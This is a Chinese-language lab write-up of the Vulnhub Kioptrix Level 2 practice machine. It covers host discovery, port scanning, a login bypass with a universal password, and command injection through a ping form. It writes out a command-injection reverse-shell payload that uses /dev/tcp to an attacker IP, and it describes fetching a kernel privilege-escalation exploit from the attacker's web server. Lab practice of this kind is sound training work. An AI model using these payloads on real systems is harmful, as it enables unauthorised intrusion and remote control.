---
title: Vulnhub-kioptrix_Level2
date: 2025-2-24 20:02:05
tags: 红队
categories: 红队打靶
---



# 信息收集

### 主机发现

```
netdiscover -i eht0 -r 192.168.137.0/24
```

![image-20250319153745788](Kioptrix%20Level2/image-20250319153745788.png)

### 端口扫描

![image-20250319165136560](Kioptrix%20Level2/image-20250319165136560.png)

将端口分离

```
ports=$(cat nmap-ports.nmap | grep open | awk -F/ '{print $1}' | tr '\n' ',')
```

## 80 端口

尝试万能密码，登录成功

![image-20250319170626895](Kioptrix%20Level2/image-20250319170626895.png)

![image-20250319171308645](Kioptrix%20Level2/image-20250319171308645.png)

缺少了输入框，查看源码是多了一个单引号，bp 抓包拦截返回包，然后修改源码就可以正常显示

![image-20250319171416770](Kioptrix%20Level2/image-20250319171416770.png)

功能是一个 ping 功能

![image-20250319171457384](Kioptrix%20Level2/image-20250319171457384.png)

可以尝试在 ip 后面跟上命令 "；" 的作用是顺序执行；

![image-20250319171556375](Kioptrix%20Level2/image-20250319171556375.png)

可以成功执行，直接在后面进行反弹 shell 即可

```
127.0.0.1;bash -c 'exec bash -i &>/dev/tcp/192.168.137.129/9991 <&1'
```

成功反弹 shell

## 提权

![image-20250319175201492](Kioptrix%20Level2/image-20250319175201492.png)

查看内核，寻找内核提权漏洞

![image-20250319175306220](Kioptrix%20Level2/image-20250319175306220.png)

下载到本地，本地开启 web 服务，靶机连接本机的 web 服务下载 exp

![image-20250319175440036](Kioptrix%20Level2/image-20250319175440036.png)

成功提权